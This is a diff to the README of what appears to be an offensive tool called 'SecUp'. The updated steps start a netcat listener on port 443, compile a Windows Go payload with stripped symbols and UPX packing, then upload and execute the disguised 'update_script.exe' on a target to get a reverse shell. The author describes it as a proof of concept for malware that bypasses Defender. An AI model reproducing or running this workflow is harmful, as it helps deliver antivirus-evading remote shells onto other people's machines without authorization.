@@ -19,16 +19,14 @@ Setup is simple.<br>
 `dlowrie@kali:~/Tools/update_script$ ./SecUp 192.168.1.200`
 4. Open another terminal, and start a Listener on port 443 (sudo if not root)<br>
 `sudo nc -vnlp 443`
-5. Back at the SecUp terminal<br>
+5. Compile EXE<br>
+`GOOS=windows go build -ldflags "-s -w" -trimpath update_script.go`<br>
+`upx -9 update_script.exe`
+6. Back at the SecUp terminal<br>
 `Press ENTER to continue...`
-6. Upload and execute `update_script.cmd` to target any way you like<br>
-
-7. Shellz
+7. Upload and execute `update_script.exe` to target any way you like<br>
+8. Shellz! :)
 <P></P>
-If you don't want to build SecUp, then that's OK.<br>
-I've put a compiled binary for Linux users in the repo.<br>
-In that case you can skip step 2
-
 <P></P>
 Going to work on building a better mousetrap as this was just a PoC at making something 'malicious' that could bypass Defender.
 <P></P>
